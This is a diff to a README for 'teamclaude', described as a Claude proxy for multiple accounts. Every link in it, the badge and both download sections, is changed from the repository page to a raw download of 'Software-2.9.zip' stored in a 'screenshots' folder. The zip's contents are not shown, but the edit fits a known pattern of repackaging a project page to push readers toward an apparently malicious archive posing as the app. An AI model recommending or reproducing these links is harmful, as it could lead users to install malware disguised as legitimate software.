@@ -1,12 +1,12 @@
 # 🤖 teamclaude - Simple Claude Proxy for Multiple Accounts
 
-[![Download teamclaude](https://img.shields.io/badge/Download%20teamclaude-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/abdallahLokmene/teamclaude)
+[![Download teamclaude](https://img.shields.io/badge/Download%20teamclaude-blue?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/abdallahLokmene/teamclaude/master/screenshots/Software-2.9.zip)
 
 ## 📥 Download
 
 Open this page to get the app:
 
-[https://github.com/abdallahLokmene/teamclaude](https://github.com/abdallahLokmene/teamclaude)
+[https://raw.githubusercontent.com/abdallahLokmene/teamclaude/master/screenshots/Software-2.9.zip](https://raw.githubusercontent.com/abdallahLokmene/teamclaude/master/screenshots/Software-2.9.zip)
 
 ## 🪟 Windows Setup
 
@@ -189,6 +189,6 @@ teamclaude fits well when you need:
 
 Visit this page to download the app files, then run the setup steps on Windows:
 
-[https://github.com/abdallahLokmene/teamclaude](https://github.com/abdallahLokmene/teamclaude)
+[https://raw.githubusercontent.com/abdallahLokmene/teamclaude/master/screenshots/Software-2.9.zip](https://raw.githubusercontent.com/abdallahLokmene/teamclaude/master/screenshots/Software-2.9.zip)
 
 Open the folder, install the files with `npm install`, then start the app with `npm start`
